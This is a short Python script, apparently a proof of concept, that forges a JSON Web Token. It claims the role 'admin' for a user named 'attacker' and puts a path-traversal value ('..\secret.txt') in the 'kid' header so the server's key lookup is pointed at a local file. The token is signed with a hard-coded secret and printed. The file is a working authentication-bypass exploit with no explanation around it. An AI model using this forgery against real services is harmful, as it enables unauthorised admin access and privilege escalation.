import jwt

payload = {
    "user": "attacker",
    "role": "admin"
}

headers = {
    "kid": "..\secret.txt"
}

token = jwt.encode(
    payload,
    "SUPER_SECRET_ADMIN_KEY",
    algorithm="HS256",
    headers=headers
)

print(token)